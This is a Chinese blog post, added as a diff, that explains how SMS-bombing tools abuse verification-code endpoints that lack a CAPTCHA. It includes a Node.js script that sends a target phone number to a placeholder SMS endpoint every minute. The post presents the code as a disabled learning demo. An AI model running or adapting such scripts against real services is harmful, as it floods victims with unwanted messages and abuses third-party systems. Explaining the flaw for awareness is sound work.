@@ -1,0 +1,67 @@
+---
+layout: post
+title: 浅析短信轰炸机的实现
+date: 2017-02-19
+---
+
+最近在某运营商的官网准备给办理个业务，发现他们允许用户通过手机号+短信验证码登录。
+在用户输入手机号后点击按钮就可以获取到短信验证码，在发送之前根本不需要用户输入图形验证码之类的内容。
+也就是说，他们根本不校验当前调用发送短信接口的是人还是机器。熟悉信息安全的人就会发现，这会给不法分子可趁之机，让他们利用该接口短信轰炸别人。
+我用postman测试了下，他们的接口也不是完全裸奔，至少还有频率限制，一分钟一次。
+于是，我就通过node.js实现了一个demo，代码大致如下：
+```javascript
+/*
+ *注意：以下代码已经经过修改，无法直接使用。
+ *同时提醒，该代码仅用作学习交流，请勿用于非法用途,否则后果作者概不负责
+ */
+
+ const https = require('https'),
+ONE_MIN = 60 * 1000; //很多网站有频率限制，此处定义为一分钟
+var success_times = 0,
+fail_times = 0,
+phoneNum = "11111111111"; //手机号
+function sendSMS() {
+    var options = {
+        hostname: 'xxx.com',
+        //网站域名
+        port: 443,
+        path: '/sendRandomCode.action?phone=' + phoneNum,
+        //发送短信验证码的接口
+        method: 'POST',
+        rejectUnauthorized: false
+    };
+
+    var req = https.request(options,
+    function(res) {
+        res.on('data',
+        function(d) {
+            if (res.statusCode == 200 && d == 0) {
+                ++success_times;
+                console.log("success times:" + success_times);
+                return;
+            }
+
+            ++fail_times;
+            console.log("fail times:" + fail_times);
+        });
+    });
+
+    req.end();
+    req.on('error',
+    function(e) {
+        console.error(e);
+    });
+}
+
+sendSMS();
+setInterval(sendSMS, ONE_MIN); //每一分钟发送一条
+
+```
+
+很多人会说，这个没用，我只要把对应的号码拉黑就行了。
+是的，对于比较弱或者比较懒的黑客，你完全可以通过手机黑名单解决。但是，绝大多数的短信轰炸机怎么可能只是单纯调一个网站的接口呢？
+
+现在很多大网站注册、付费、修改个人信息时，都经常需要手机验证码。
+开发短信轰炸机的人早就将存在漏洞的网站接口收集好了，当在轰炸机上输入了手机号码后，
+程序就会逐个去请求发送短信的URL，其中的参数就是手机号，那些网站在收到请求后就会往这个号码发短信了。
+一会儿几十或上百条各种网站的验证码、购买信息等垃圾短信就被发送到了这个手机上。
